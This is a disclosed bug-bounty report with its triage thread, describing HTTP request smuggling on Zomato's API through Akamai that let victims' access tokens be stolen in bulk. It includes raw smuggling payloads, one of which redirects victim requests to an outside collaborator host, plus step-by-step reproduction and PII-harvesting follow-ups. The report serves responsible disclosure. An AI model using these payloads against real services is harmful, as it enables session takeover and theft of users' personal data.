---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/http-request-smuggling
  - env/web
  - vuln/info-disclosure
  - vuln/open-redirect
  - impact/credential-theft
  - impact/sensitive-data
  - trigger/session-cookie
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2020-07-09
submitted: 2020-01-10T14:24:17.581Z
bounty_usd: null
votes: 559
cve: []
program: "[[programs/eternal|Eternal]]"
reporter: "defparam"
source: "https://hackerone.com/reports/771666"
title: "Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com"
---
# Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 559 | **Program:** Eternal | **Disclosed:** 2020-07-09

- Report: [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)
- CWE: HTTP Request Smuggling
- Submitted: 2020-01-10T14:24:17.581Z

## Report summary

Account takeover vulnerability using HTTP Request Smuggling and Desync attacks, this time through Akamai en route to Zomato. A big thanks to Zomato and Akamai for working with me to fix these issues in a timely manner.

For more information about these types of vulnerabilities check out my talk [Practical Attacks using HTTP Request Smuggling](https://youtu.be/3tpnuzFLU8g)

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Intro
Hi Zomato Security Team!
My name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I've taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads. When evaluating your platform I've found one asset that falls victim to HTTP Smuggling Attacks that result in: PII/Information Leakage, Session Takeover, Victim Request Hijacking/Forging and Forced Victim Redirection to Attacker Endpoint. this is a serious bug that should be dealt with immediately as any bad Actor could use these issues to stage attacks that could cause severe damage to Zomato and Zomato's Customers.

# api.zomato.com
## The Request Smuggling Bug
This asset is vulnerable several CL.TE-based HTTP Request Smuggling issues. This issue can cause data to poison the backend server socket and interfere with customer requests. One specific payload that cause issues are named in my tool as: "**tabprefix1**". This payload is a mutation of the "**Transfer-Encoding: chunked**" header that is placed in an HTTP request with "**Content-Length: (length)**" header. In the HTTP spec it is stated that when both Transfer-Encoding: chunked and Content-Length headers are specified then the server should always prioritize chunked encoding over Content-Length sizing. However, in cases when multiple reverse proxies are inline to an HTTP connection and a corner case TE and CL header are both specified, there are times when the frontend server may not recognize the TE header and fallback to CL processing while the backend server recognizes the TE header and prioritizes it over CL. When this happens it is considered HTTP De-synchronization which can lead to Request Smuggling (attacker data poisoning the backend socket into the victim connection).

Definition of **tabprefix1**:
- An HTTP request where both CL and TE headers are specified and where the TE header is formatted like so:
	- ``Transfer-Encoding:\tchunked`` (note that there is a tab after the colon and before the 'chunked', this disrupts the parsing)

This asset specifically shows issues with the **tabprefix1** test (see glimpse below)

{F680682}

If we focus on this specific attack payload,  here is what a typical hijack would look like:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7

0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```
If you look closely at the headers both Transfer-Encoding and Content-Length headers are specified in this payload. This hits a natural corner case in which Transfer-Encoding takes priority over the Content-Length, however if you look closely this payload places a tab character after the colon on the Transfer-Encoding line. By doing this the frontend server rejects that line and processes the whole request using the length of 51 found in the Content-Length header and forwards all 51 bytes of data to the backend server. The backend server sees the same HTTP request and processes the `Transfer-Encoding : chunked` as a normal chunked request. The issue is that the chucked request specifies 0 bytes of data and the remaining data of the 51 bytes is left on socket to poison the next customer request that comes into the backend server. Since this payload has no return characters after the "X-Ignore: X" then the poison data essentially pre-pends onto the customer request, their HTTP request line is deleted and the customer is redirected to `/some/other/endpoint`


# Bug #1 - Chain with an Open Redirect to Steal Session Tokens at Bulk
This bug is the big one that I believe is critical. As an attacker with Burp, one can craft a single Request Smuggling payload to steal a customer session token on Zomato. The following payload can be pasted into the repeater to illustrate this:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```
It appears when you smuggle and hijack an HTTP request and you change the request endpoint to be: `https://some.host.name/desync/` on the request line the backend server should never see a request like this because the frontend server immediately returns `404 Not Found`. However, if you smuggle it past the frontend server to the backend then the request is never filtered and it is responded to with a `301 Moved Permanently` to the location `http://some.host.name/desync`. When we do that to a victim connection the victim's HTTP client automatically redirects to the new location with the same exact headers (including and most importantly the `X-Access-Token:` header). In my test I set up a Burp Collaborator client with an address to force redirection to. The collaborator sees the DNS lookup and the HTTP Request with the  `X-Access-Token:` token. Futhermore I also receive the IP address of the victim.

Here is an example of me sending 1 smuggle/hijack to a victim in Burp Repeater:
█████

Here is the victim request showing up in my collaborator:
█████████

To illustrate impact, an attacker could write a script to scrape Access-Tokens this way, then with the access token grab the UserID via `GET /v2/tabbed/home HTTP/1.1`. Then with the Access-Token/UserID pair the attacker can access: `GET /v2/userdetails.json/<USERID> HTTP/1.1` to get the victim's First/Last Name, Phone Number, Email address, etc..

Also the attacker can perform full session takeover/impersonation by performing a normal login into zomato, intercept the response to his own `POST /v2/auth` request and swap his Access-Token/USERID with the victim's Access-Token/USERID. By doing this the mobile app will log onto zomato as if the attacker were the victim.

# Bug #1 - Triage
1) Open Burp and go into the Repeater tab
2) Click send and enter in the hostname/port/SSL (api.zomato.com 443 checked)
3) Click on menu Burp->Burp Collaborator client
4) In the Collaborator window set to Poll every 1 second and click on "Copy to clipboard", your collaborator URL should be in the clipboard, keep it saved
5) Back in the repeater paste the following as your request body:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```
and replace YOUR_COLLAB_URL with the one copied from your collab client

6) Click send as many times required to see HTTP requests in your collab window.
**NOTE**: Sometimes you may just see DNS requests to your collaborator. Send the payload out as many times required to see an HTTP request.

# Conclusion
Thanks for your time reading my report and performing triage. I hope this writeup proves helpful! I have ceased my testing on `api.zomato.com` until remedy is in place. Once your team had remedy in place I will be happy to run my array of desync tests on the asset.

Thanks,
@defparam

## Impact

Attacker can achieve victim session takeover in bulk and steal all information from the victim. This attack can be automated to perform this process in bulk. Since this is the case I have filed this report as **Critical** because I believe it meets the criteria of:

`Information Disclosure - mass PII leaks including data such as names, phone numbers and addresses`

## Timeline

- **Report Filed**
- **2020-01-10** @defparam: When assessing if this is a `Mass PII leak`, Using TurboIntruder in a small sample test I was able to steal an account per every 2 or 3 requests before getting rate limited. An attacker could set up several attacker processes across IP addresses/geos to bypass rate limiting and increase the throughput of account takeovers. A successful attack like this could compromise most of the userbase
- **2020-01-10** @biryani-is-lob: Hi @defparam, 

Thanks for the submission, looking into this. 
 @ehsahil-zomato
- **Report Needs More Info**
- **Report New**
- **2020-01-10** @biryani-is-lob: @defparam, 

I am able to reproduce the behavior you are describing in the provided video PoC, I am asking for the video PoC showing other users PII leak to assess the severity of the issue. 

Thanks 
@ehsahil
- **2020-01-10** @defparam: @ehsahil,

Ah, I'm sorry! I misunderstood. Here is the sequel to my movie part 2 (lol)
████████

Best,
@defparam
- **Report Triaged**
- **2020-01-11** @prateek_0490-zomato: Hi @defparam - Awesome find. Out of curiosity, are you still testing it? ████████

We’re working on the fix.

Prateek
- **Report Severity Updated**
- **2020-01-11** @defparam: @prateek_0490-zomato ,

I've only ran a handful of tests today and that was to make the video for @ehsahil-zomato, Since then I haven't touched the asset and I've double check my machine, I have no traffic being sent to Zomato.
Last time I sent continuous traffic was thursday evening eastern standard timezone. Once I found the bug I finished testing and sent my report the next morning (today).

Best,
@defparam
- **2020-01-13** @prateek_0490-zomato: Hi @defparam - thanks, just a quick update - we're still working on it. We're taking multiple steps to mitigate this issue and apart from this we're also proactively adding checks to avoid such vulnerabilities.

Again, this was a great find. Keep Hunting.

P.S. - We're deciding on the bounty, please allow us time to get back.

Prateek
- **2020-01-13** @defparam: Hey @prateek_0490-zomato ,

Many thanks! Take your time, there's no rush here on my end. I'm happy to test the remedies once they are staged.

Best Regards,
@defparam
- **2020-01-14** @prateek_0490-zomato: Hi @defparam - We've deployed a fix, we will still be hardening it a bit more throughout the week.

Let me explain you about what was actually happening - so, basically this was happening at the AKAMAI level where the request were getting poisoned which lead to the issue and ideally those requests never reached our backend servers. Below rough illustration should give you a better idea -

{F684136}

Additionally, we are still investigating and figuring out the users who got affected because of this and as a precautionary measure we will be revoking their tokens. Initial investigation shows the count isn't exceeding hundred. Could you please confirm if the below IP is of your Digital Ocean instance -

- 159.8█████

Moreover, can you please go ahead and retest all the possible scenarios and try to bypass the current fixes in place? We really appreciate your help and cooperation in keeping @Zomato secure :)

Looking forward to hear back.

Prateek
- **2020-01-14** @defparam: Hi @prateek_0490-zomato ,

Very interesting! I did not expect that the desync had been solely contained within Akamai! One interesting this about this finding is that I would have normally ran my array of desync tests on Zomato and moved on happy. This is because for my normal tests I usually use the **GET** or **POST** http verbs which showed that **api.zomato.com** passed with no desync problems. However, for some reason I decided to retest using the **DELETE** verb and this is where I saw all the desync issues listed in my tool. I'm glad I found it because now I'm sure to perform my desync tests across a variety of HTTP verbs going forward. Thanks for the write up!

Yes I can confirm that ``159.8███`` is my digital ocean instance ;)

I re-ran my tests and I see no issues at all with the asset now.
███████
███
███████
███████

Super interesting bug, Thanks!
Best,
@defparam
- **2020-01-14** @prateek_0490-zomato: Awesome, thanks much for the confirmation, @defparam :)

AKAMAI is also rolling out the fix at their platform level in couple of days, I'll keep the report open until then and will request you to retest it again once that has been deployed.

We've been reviewing/investigating report for bounty, so expect to hear back by end of this week. Looking forward to receive some more awesome reports from you. Happy hunting!

Thanks again for helping us keep @Zomato safe and secure for our users.

Prateek
- **Bounty Awarded**
- **2020-01-16** @prateek_0490-zomato: Hi @defparam - We're still awaiting to hear back from AKAMAI, once they release a platform level fix, we will update here and request you to please retest it to see if you can find a bypass.

Enjoy the bounty and keep hunting!

Prateek
- **2020-01-16** @defparam: Thanks @Zomato !

I'm honored on the bounty amount past your advertised max! It illustrates how critical the issue was and I'm glad the team fixed it in a timely manner. Once let me know when you need one last re-test and I'm happy to run it.

Thanks again for your generous bounty,
Best,
@defparam
- **2020-01-22** @prateek_0490-zomato: @defparam - We're still awaiting to hear back on this, will keep you posted.

Prateek
- **2020-01-22** @defparam: Hey @prateek_0490-zomato ,

No worries. Akamai’s threat analysis team did reach out to me on Friday. They mentioned this report is the second bug I found in their WAF (the first being from a different BB program) and wanted data on the test vectors I’ve been using. I provided that data late Friday. It was a national holiday in US on Monday so they are probably currently spinning up their test scripts with my vectors this week.

Best,
@defparam
- **2020-01-22** @prateek_0490-zomato: @defparam - We thought so based on the conversations we're having with them. We're also going back and forth and pushing them :)

Thanks for the updates. Will let you know in case we hear back from them, and either way do let us know if you hear back from them first :)

Prateek
- **Report Resolved**
- **2020-01-28** @defparam: March?! wow, yeah I don’t blame you guys. Well, things appeared good on the last scan. Looking forward to working with you again.

Cheers,
Evan
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
